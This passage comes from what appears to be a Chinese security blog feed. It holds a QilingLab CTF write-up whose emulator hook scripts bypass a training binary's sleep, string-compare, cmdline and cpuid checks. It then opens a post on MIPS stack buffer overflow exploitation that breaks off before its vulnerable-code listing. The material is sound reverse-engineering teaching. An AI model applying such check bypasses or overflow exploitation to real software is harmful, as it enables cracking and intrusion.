class="hljs-symbol">.text:</span>0000000000000F3C                 <span class="hljs-keyword">call</span>    _sleep # hook 这个地址<br><span class="hljs-symbol">.text:</span>0000000000000F41                 <span class="hljs-keyword">nop</span><br><span class="hljs-symbol">.text:</span>0000000000000F42                 <span class="hljs-keyword">leave</span><br><span class="hljs-symbol">.text:</span>0000000000000F43                 <span class="hljs-keyword">retn</span><br><span class="hljs-symbol">.text:</span>0000000000000F43 <span class="hljs-comment">; &#125; // starts at F24</span><br><span class="hljs-symbol">.text:</span>0000000000000F43 challenge7      endp<br><br>unsigned <span class="hljs-keyword">int</span> __fastcall challenge7(_<span class="hljs-built_in">BYTE</span> *a1)<br>&#123;<br>  *a1 = <span class="hljs-number">1</span><span class="hljs-comment">;</span><br>  return sleep(<span class="hljs-number">0xFFFFFFFF</span>)<span class="hljs-comment">;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>hook 的办法，可以修改sleep 的参数。</p><p>网上有三种办法： 1.直接使用qiling 的api 来hook sleep 函数，直接返回。</p><ol start="2"><li>直接hook 这个参数</li><li>直接hook sleep 的系统调用函数nanosleep （这个用的应该不多）</li></ol><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-keyword">def</span> <span class="hljs-title function_">modify_arg</span>(<span class="hljs-params"><span class="hljs-symbol">ql:</span><span class="hljs-title class_">Qiling</span></span>):<br>ql.arch.regs.edi=<span class="hljs-number">0</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hook_sleep</span>(<span class="hljs-params"><span class="hljs-symbol">ql:</span><span class="hljs-title class_">Qiling</span></span>):<br><span class="hljs-keyword">return</span> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">challenge7</span>(<span class="hljs-params"><span class="hljs-symbol">ql:</span><span class="hljs-title class_">Qiling</span></span>):<br>base_addr = ql.mem.get_lib_base(os.path.split(ql.path)[-<span class="hljs-number">1</span>])<br><span class="hljs-comment"># method1 直接hook sleep 传入的参数 的寄存器edi</span><br><span class="hljs-comment">#ql.os.set_api(&#x27;sleep&#x27;,modify_arg,QL_INTERCEPT.ENTER)</span><br>ql.hook_address(modify_arg,base_addr+<span class="hljs-number">0xF3C</span>)<br><span class="hljs-comment"># method2 直接hook sleep 函数，让它返回0</span><br><span class="hljs-comment">#ql.os.set_api(&#x27;sleep&#x27;,hook_sleep)</span><br></code></pre></td></tr></table></figure><h4 id="challenge8-writeup"><a href="#challenge8-writeup" class="headerlink" title="challenge8 writeup"></a>challenge8 writeup</h4><h4 id="challenge9-writeup"><a href="#challenge9-writeup" class="headerlink" title="challenge9 writeup"></a>challenge9 writeup</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">unsigned</span> __int64 __fastcall <span class="hljs-title">challenge9</span><span class="hljs-params">(<span class="hljs-type">bool</span> *a1)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">char</span> *i; <span class="hljs-comment">// [rsp+18h] [rbp-58h]</span><br>  <span class="hljs-type">char</span> dest[<span class="hljs-number">32</span>]; <span class="hljs-comment">// [rsp+20h] [rbp-50h] BYREF</span><br>  <span class="hljs-type">char</span> src[<span class="hljs-number">40</span>]; <span class="hljs-comment">// [rsp+40h] [rbp-30h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v5; <span class="hljs-comment">// [rsp+68h] [rbp-8h]</span><br><br>  v5 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-built_in">strcpy</span>(src, <span class="hljs-string">&quot;aBcdeFghiJKlMnopqRstuVWxYz&quot;</span>);<br>  <span class="hljs-built_in">strcpy</span>(dest, src);<br>  <span class="hljs-keyword">for</span> ( i = dest; *i; ++i )<br>    *i = <span class="hljs-built_in">tolower</span>(*i);<br>  *a1 = <span class="hljs-built_in">strcmp</span>(src, dest) == <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v5;<br></code></pre></td></tr></table></figure><p>只需要最终的src和dest 一致就够了，但是tolower 会改变dest的大小写。</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-keyword">def</span> <span class="hljs-title function_">hook_tolower</span>(<span class="hljs-params"><span class="hljs-symbol">ql:</span><span class="hljs-title class_">Qiling</span></span>):<br><span class="hljs-keyword">return</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hook_strcmp</span>(<span class="hljs-params"><span class="hljs-symbol">ql:</span><span class="hljs-title class_">Qiling</span></span>):<br>ql.arch.regs.rax=<span class="hljs-number">0</span><br><span class="hljs-comment">#return 0</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">challenge9</span>(<span class="hljs-params"><span class="hljs-symbol">ql:</span><span class="hljs-title class_">Qiling</span></span>):<br>ql.os.set_api(<span class="hljs-string">&#x27;strcmp&#x27;</span>,hook_strcmp)<br><span class="hljs-comment">#ql.os.set_api(&#x27;tolower&#x27;,hook_tolower)</span><br></code></pre></td></tr></table></figure><p>因此只需要hook 其中的strcmp（） 和tolower 函数。</p><h4 id="challenge10-writeup-hook-FS"><a href="#challenge10-writeup-hook-FS" class="headerlink" title="challenge10 writeup hook FS"></a>challenge10 writeup hook FS</h4><p>hook 文件系统</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">unsigned</span> __int64 __fastcall <span class="hljs-title">challenge10</span><span class="hljs-params">(_BYTE *a1)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+10h] [rbp-60h]</span><br>  <span class="hljs-type">int</span> fd; <span class="hljs-comment">// [rsp+14h] [rbp-5Ch]</span><br>  <span class="hljs-type">ssize_t</span> v4; <span class="hljs-comment">// [rsp+18h] [rbp-58h]</span><br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">72</span>]; <span class="hljs-comment">// [rsp+20h] [rbp-50h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v6; <span class="hljs-comment">// [rsp+68h] [rbp-8h]</span><br><br>  v6 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  fd = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/proc/self/cmdline&quot;</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">if</span> ( fd != <span class="hljs-number">-1</span> )<br>  &#123;<br>    v4 = <span class="hljs-built_in">read</span>(fd, buf, <span class="hljs-number">0x3F</span>uLL);<br>    <span class="hljs-keyword">if</span> ( v4 &gt; <span class="hljs-number">0</span> )<br>    &#123;<br>      <span class="hljs-built_in">close</span>(fd);<br>      <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; v4 &gt; i; ++i )<br>      &#123;<br>        <span class="hljs-keyword">if</span> ( !buf[i] )<br>          buf[i] = <span class="hljs-number">32</span>;<br>      &#125;<br>      buf[v4] = <span class="hljs-number">0</span>;<br>      <span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">strcmp</span>(buf, <span class="hljs-string">&quot;qilinglab&quot;</span>) )<br>        *a1 = <span class="hljs-number">1</span>;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v6;<br></code></pre></td></tr></table></figure><p>这里的hook思路是hook 文件系统&#x2F;proc&#x2F;self&#x2F;cmdline ,使读取的值是qilinglab</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-keyword">class</span> hook_cmdline(<span class="hljs-title class_">QlFsMappedObject</span>):<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read</span>(<span class="hljs-params"><span class="hljs-variable language_">self</span>,size</span>):<br><span class="hljs-keyword">return</span> b<span class="hljs-string">&quot;qilinglab&quot;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">close</span>(<span class="hljs-params"><span class="hljs-variable language_">self</span></span>):<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">challenge10</span>(<span class="hljs-params"><span class="hljs-symbol">ql:</span><span class="hljs-title class_">Qiling</span></span>):<br>ql.add_fs_mapper(<span class="hljs-string">&quot;/proc/self/cmdline&quot;</span>,hook_cmdline())<br><br></code></pre></td></tr></table></figure><p>还有另一种方法</p><p>可以直接替换指定文件成我们的文件，先创建我们需要的文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> -n <span class="hljs-string">&quot;qilinglab&quot;</span>&gt; fake_cmdline<br></code></pre></td></tr></table></figure><p>然后代码就可以这样写了：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs scss">def <span class="hljs-built_in">challenge10</span>(ql：Qiling):<br>ql.<span class="hljs-built_in">add_fs_mapper</span>(<span class="hljs-string">&quot;/proc/self/cmdline&quot;</span>, <span class="hljs-string">&quot;./fake_cmdline&quot;</span>)<br></code></pre></td></tr></table></figure><p>还一种方法，代码也不用写了，直接往qiling的rootfs里面写：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">mkdir -p .<span class="hljs-regexp">/qiling/</span>examples<span class="hljs-regexp">/rootfs/</span>x8664_linux<span class="hljs-regexp">/proc/</span>self<br>echo -n <span class="hljs-string">&quot;qilinglab&quot;</span> &gt; .<span class="hljs-regexp">/qiling/</span>examples<span class="hljs-regexp">/rootfs/</span>x8664_linux<span class="hljs-regexp">/proc/</span>self/cmdline<br></code></pre></td></tr></table></figure><p>challenge11 writeup hook 指令</p><p>使用的是hook_code()对单挑指令进行hook，不同于hook库函数和系统调用，这里使用hook_code对单条指令进行hook，hook指令的时候可以限制hook的范围，加速hook的效率，具体的方法是通过map的读写权限和map的文件名限制hook的范围</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">def</span> hook_cpuid(ql,address,size):<br>    <span class="hljs-attribute">opcode</span> = ql.mem.read(address,size)<br>    <span class="hljs-attribute">if</span> opcode == b<span class="hljs-string">&quot;\x0F\xA2&quot;</span>:<br>        <span class="hljs-comment"># bypass check and jump to next instruction</span><br>        <span class="hljs-attribute">ql</span>.reg.ebx = <span class="hljs-number">0</span>x696C6951<br>        <span class="hljs-attribute">ql</span>.reg.ecx = <span class="hljs-number">0</span>x614C676E<br>        <span class="hljs-attribute">ql</span>.reg.edx = <span class="hljs-number">0</span>x20202062<br>        <span class="hljs-attribute">ql</span>.reg.rip += <span class="hljs-number">2</span><br><span class="hljs-comment"># search code segment hook every cpuid</span><br><span class="hljs-attribute">begin</span>, end = <span class="hljs-number">0</span>, <span class="hljs-number">0</span><br><span class="hljs-attribute">for</span> info in ql.mem.map_info:<br>    <span class="hljs-attribute">if</span> ql.path in info[<span class="hljs-number">3</span>] and info[<span class="hljs-number">2</span>] == <span class="hljs-number">5</span>:<br>        <span class="hljs-attribute">begin</span>,end = info[:<span class="hljs-number">2</span>]<br><span class="hljs-attribute">ql</span>.hook_code(hook_cpuid,begin=begin,end=end)<br></code></pre></td></tr></table></figure><p>完整代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#-*- coding:utf-8 -*-</span><br><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment"># </span><br><span class="hljs-comment"># Cross Platform and Multi Architecture Advanced Binary Emulation Framework</span><br><span class="hljs-comment">#</span><br><br><span class="hljs-keyword">import</span> sys<br>sys.path.append(<span class="hljs-string">&quot;..&quot;</span>)<br><br><span class="hljs-keyword">from</span> qiling <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from qiling.const import QL_VERBOSE</span><br><span class="hljs-keyword">from</span> qiling.const <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> qiling.os.mapper <span class="hljs-keyword">import</span> QlFsMappedObject<br><span class="hljs-keyword">import</span> os<br><br><span class="hljs-comment"># </span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">challenge1</span>(<span class="hljs-params">ql:Qiling</span>):<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;1111111&quot;</span>+<span class="hljs-built_in">str</span>(ql.mem.is_mapped(<span class="hljs-number">0x1000</span>,<span class="hljs-number">0x1000</span>)))<br>ql.mem.<span class="hljs-built_in">map</span>(<span class="hljs-number">0x1000</span>,<span class="hljs-number">0x1000</span>,info=<span class="hljs-string">&#x27;[challenge1]&#x27;</span>)<br>ql.mem.write(<span class="hljs-number">0x1337</span>,ql.pack16(<span class="hljs-number">1337</span>)) <span class="hljs-comment"># pack16(value) == struct.pack(&#x27;H&#x27;,value)</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hook_uname_on_exit</span>(<span class="hljs-params">ql: Qiling, *args</span>):<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">.text:0000000000000BD8                 lea     rax, [rbp+name]</span><br><span class="hljs-string">.text:0000000000000BDF                 mov     rdi, rax        ; name</span><br><span class="hljs-string">.text:0000000000000BE2                 call    _uname</span><br><span class="hljs-string">.text:0000000000000BE7                 test    eax, eax</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>rdi = ql.arch.regs.rdi<br>ql.mem.write(rdi, <span class="hljs-string">b&#x27;QilingOS\x00&#x27;</span>)<br>ql.mem.write(rdi + <span class="hljs-number">65</span> * <span class="hljs-number">3</span>, <span class="hljs-string">b&#x27;ChallengeStart\x00&#x27;</span>)<br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">challenge2</span>(<span class="hljs-params">ql:Qiling</span>):<br>ql.os.set_syscall(<span class="hljs-string">&#x27;uname&#x27;</span>, hook_uname_on_exit, QL_INTERCEPT.EXIT)<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Fake_urandom</span>(<span class="hljs-title class_ inherited__">QlFsMappedObject</span>):<br><span class="hljs-comment"># Fake read fs operation</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read</span>(<span class="hljs-params">self, size</span>):<br><span class="hljs-keyword">if</span> size == <span class="hljs-number">1</span>:<br><span class="hljs-keyword">return</span> <span class="hljs-string">b&quot;\x41&quot;</span><br><span class="hljs-keyword">return</span> <span class="hljs-string">b&quot;\x00&quot;</span>*size<br><span class="hljs-comment"># Fake close fs operation</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">close</span>(<span class="hljs-params">self</span>):<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getrandom_hook</span>(<span class="hljs-params">ql:Qiling, buf, buflen, flags, *args</span>):<br>ql.mem.write(buf,<span class="hljs-string">b&quot;\x00&quot;</span>*buflen)<br>ql.os.set_syscall_return(<span class="hljs-number">0</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">challenge3</span>(<span class="hljs-params">ql:Qiling</span>):<br>ql.os.set_syscall(<span class="hljs-string">&quot;getrandom&quot;</span>, getrandom_hook)<br>ql.add_fs_mapper(<span class="hljs-string">&quot;/dev/urandom&quot;</span>,Fake_urandom())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">enter_forbidden_loop_hook</span>(<span class="hljs-params">ql:Qiling</span>):<br>ql.arch.regs.eax =<span class="hljs-number">1</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">challenge4</span>(<span class="hljs-params">ql:Qiling</span>):<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[++++]&quot;</span>+os.path.split(ql.path)[-<span class="hljs-number">1</span>])<br><span class="hljs-comment"># get_lib_base need the real filename which is qilinglab-x86_64</span><br>base_addr = ql.mem.get_lib_base(os.path.split(ql.path)[-<span class="hljs-number">1</span>])<br><span class="hljs-built_in">print</span>(base_addr)<br><span class="hljs-comment"># Address we need to patch</span><br>test_forbidden_loop_enter =base_addr+ <span class="hljs-number">0xE43</span><br><span class="hljs-comment"># Place hook</span><br>ql.hook_address(enter_forbidden_loop_hook, test_forbidden_loop_enter)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hook_rand</span>(<span class="hljs-params">ql:Qiling</span>):<br>ql.arch.regs.rax = <span class="hljs-number">0</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">challenge5</span>(<span class="hljs-params">ql:Qiling</span>):<br>ql.os.set_api(<span class="hljs-string">&#x27;rand&#x27;</span>,hook_rand)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hook_while_true</span>(<span class="hljs-params">ql:Qiling</span>):<br><br>ql.arch.regs.rax = <span class="hljs-number">0</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">challenge6</span>(<span class="hljs-params">ql:Qiling</span>):<br>base = ql.mem.get_lib_base(<span class="hljs-string">&quot;qilinglab-x86_64&quot;</span>)<br>ql.hook_address(hook_while_true,base + <span class="hljs-number">0xF16</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">modify_arg</span>(<span class="hljs-params">ql:Qiling</span>):<br>base_addr = ql.mem.get_lib_base(os.path.split(ql.path)[-<span class="hljs-number">1</span>])<br>ql.arch.regs.edi=<span class="hljs-number">0</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hook_sleep</span>(<span class="hljs-params">ql:Qiling</span>):<br><span class="hljs-keyword">return</span> <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">challenge7</span>(<span class="hljs-params">ql:Qiling</span>):<br><span class="hljs-comment"># 这个是获取文件的名字</span><br>base_addr = ql.mem.get_lib_base(os.path.split(ql.path)[-<span class="hljs-number">1</span>])<br><span class="hljs-comment"># method1</span><br><span class="hljs-comment">#ql.os.set_api(&#x27;sleep&#x27;,modify_arg,QL_INTERCEPT.ENTER)</span><br>ql.hook_address(modify_arg,base_addr+<span class="hljs-number">0xF3C</span>)<br><span class="hljs-comment"># method2</span><br><span class="hljs-comment">#ql.os.set_api(&#x27;sleep&#x27;,hook_sleep)</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hook_tolower</span>(<span class="hljs-params">ql:Qiling</span>):<br><span class="hljs-keyword">return</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hook_strcmp</span>(<span class="hljs-params">ql:Qiling</span>):<br>ql.arch.regs.rax=<span class="hljs-number">0</span><br><span class="hljs-comment">#return 0</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">challenge9</span>(<span class="hljs-params">ql:Qiling</span>):<br>ql.os.set_api(<span class="hljs-string">&#x27;strcmp&#x27;</span>,hook_strcmp)<br><span class="hljs-comment">#ql.os.set_api(&#x27;tolower&#x27;,hook_tolower)</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">hook_cmdline</span>(<span class="hljs-title class_ inherited__">QlFsMappedObject</span>):<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read</span>(<span class="hljs-params">self,size</span>):<br><span class="hljs-keyword">return</span> <span class="hljs-string">b&quot;qilinglab&quot;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">close</span>(<span class="hljs-params">self</span>):<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">challenge10</span>(<span class="hljs-params">ql:Qiling</span>):<br>ql.add_fs_mapper(<span class="hljs-string">&quot;/proc/self/cmdline&quot;</span>,hook_cmdline())<br><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-comment">#ql = Qiling([&quot;rootfs/x8664_linux/qilinglab-x86_64&quot;], &quot;rootfs/x8664_linux&quot;, verbose=QL_VERBOSE.DEFAULT)</span><br>    path=[<span class="hljs-string">&quot;rootfs/x8664_linux/qilinglab-x86_64&quot;</span>]<br>    rootfs = <span class="hljs-string">&quot;rootfs/x8664_linux&quot;</span><br>    ql = Qiling(path, rootfs)<br>    challenge1(ql)<br>    challenge2(ql)<br>    challenge3(ql)<br>    challenge4(ql)<br>    challenge5(ql)<br>    challenge6(ql)<br>    challenge7(ql)<br>    challenge9(ql)<br>    challenge10(ql)<br>    ql.verbose = <span class="hljs-number">0</span><br>    ql.mem.show_mapinfo()<br>    ql.run()<br></code></pre></td></tr></table></figure><p>参考讲解：</p><p><a href="https://badmonkey.site/archives/qilinglab-writeup#challenge-11">https://badmonkey.site/archives/qilinglab-writeup#challenge-11</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>mips架构堆栈缓冲区溢出调试与利用</title>
    <link href="/2023/12/18/mips%E6%9E%B6%E6%9E%84___%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%A9%E7%94%A8/"/>
    <url>/2023/12/18/mips%E6%9E%B6%E6%9E%84___%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%A9%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="mips架构堆栈缓冲区溢出调试与利用"><a href="#mips架构堆栈缓冲区溢出调试与利用" class="headerlink" title="mips架构堆栈缓冲区溢出调试与利用"></a>mips架构堆栈缓冲区溢出调试与利用</h1><h2 id="MIPS-堆栈原理"><a href="#MIPS-堆栈原理" class="headerlink" title="MIPS 堆栈原理"></a>MIPS 堆栈原理</h2><p>栈是一种具有先进后出队列性质的数据结构。调用栈（Call Stack）是指存放某个程序正在运行的函数的信息的栈。调用栈由栈帧(Stack Frame)组成，每个栈帧对应一个未完成运行的函数。<br>这里主要介绍 物联网设备中常见的指令架构MIPS32 ，这个架构中的函数有两种，叶子函数和非叶子函数，判断叶子函数的方式只需要判断函数内是否调用其他函数，有调用则是非叶子函数，没有调用则是叶子函数，</p><h3 id="非叶子函数调用过程"><a href="#非叶子函数调用过程" class="headerlink" title="非叶子函数调用过程"></a>非叶子函数调用过程</h3><p>程序在跳转到非叶子函数以后，则非叶子函数会把调用它的函数的返回地址(也就是$RA寄存器)存入堆栈中，再将自己函数返回地址存入到$RA，在函数返回时，非叶子函数会将栈中先前保存的返回地址取出保存到$RA中，再执行 “jr $ra”返回原函数。</p><h3 id="叶子函数调用过程"><a href="#叶子函数调用过程" class="headerlink" title="叶子函数调用过程"></a>叶子函数调用过程</h3><p>程序在跳转到叶子函数中，过程比较简单，叶子函数不会改变寄存器$RA的值，因为函数跳转到它，就不会再有跳转了，因此在函数返回时，直接 “jr $ra”返回原函数。</p><h3 id="函数调用参数传递"><a href="#函数调用参数传递" class="headerlink" title="函数调用参数传递"></a>函数调用参数传递</h3><p>在MIPS 体系的函数调用过程中，通过$a0~ $a3 传递前四个参数，多余的通过栈传递。</p><h3 id="栈空间缓冲区溢出"><a href="#栈空间缓冲区溢出" class="headerlink" title="栈空间缓冲区溢出"></a>栈空间缓冲区溢出</h3><p>栈空间缓冲区是用于内存中存储数据的内存区域。<br>缓冲区溢出就是大缓冲区数据向小缓冲区复制的过程中，由于没有检查小缓冲区的边界或者检车不严格，导致小缓冲区明显不足以接收整个大缓冲区的数据，超出的部分覆盖了与小缓冲区相邻的内存区中的其他数据而引发的内存问题。<br>成功利用缓冲区溢出可能造成严重的后果，基本上可分为3 种情况，分别是拒绝服务、获得用户权限、获得系统权限。</p><p>接下来和我一起来学习栈空间缓冲区溢出吧！ ：）</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>系统：Ubuntu 16.04<br>工具：IDA 7.5、QEMU<br>mips交叉编译环境</p><h2 id="漏洞代码"><a href="#漏洞代码" class="headerlink" title="漏洞代码"></a>漏洞代码</h2><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span 